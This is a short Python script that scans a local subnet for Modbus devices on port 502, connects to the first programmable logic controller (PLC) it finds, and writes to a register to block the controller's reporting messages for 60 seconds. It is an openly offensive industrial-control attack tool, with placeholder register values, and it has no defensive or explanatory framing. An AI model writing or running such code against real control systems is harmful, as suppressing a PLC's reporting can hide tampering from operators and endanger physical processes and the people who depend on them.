import nmap
from pymodbus.client import ModbusTcpClient
import time

# Function to find the PLC's IP address
def find_plc_ip():
    nm = nmap.PortScanner()
    nm.scan('192.168.1.0/24', arguments='-p 502')  # Adjust the subnet and port as needed
    for host in nm.all_hosts():
        if nm[host].has_tcp(502) and nm[host]['tcp'][502]['state'] == 'open':
            return host
    return None

# Function to block reporting messages
def block_reporting_messages(plc_ip):
    client = ModbusTcpClient(plc_ip)
    if not client.connect():
        print(f"Failed to connect to PLC at {plc_ip}")
        return

    try:
        # Example: Block reporting by writing to a specific register
        # This is a conceptual example. The actual register and value will depend on your PLC configuration.
        register_address = 0x0001  # Example register address
        value_to_write = 0x0000  # Example value to write to block reporting

        # Write to the register to block reporting
        result = client.write_register(register_address, value_to_write)
        if result.isError():
            print(f"Failed to write to register {register_address}")
        else:
            print(f"Successfully wrote to register {register_address} to block reporting")

        # Keep the connection open for a while to maintain the block
        time.sleep(60)  # Block for 60 seconds

    finally:
        client.close()

# Main function
def main():
    plc_ip = find_plc_ip()
    if plc_ip:
        print(f"PLC found at IP address: {plc_ip}")
        block_reporting_messages(plc_ip)
    else:
        print("PLC not found on the network")

if __name__ == "__main__":
    main()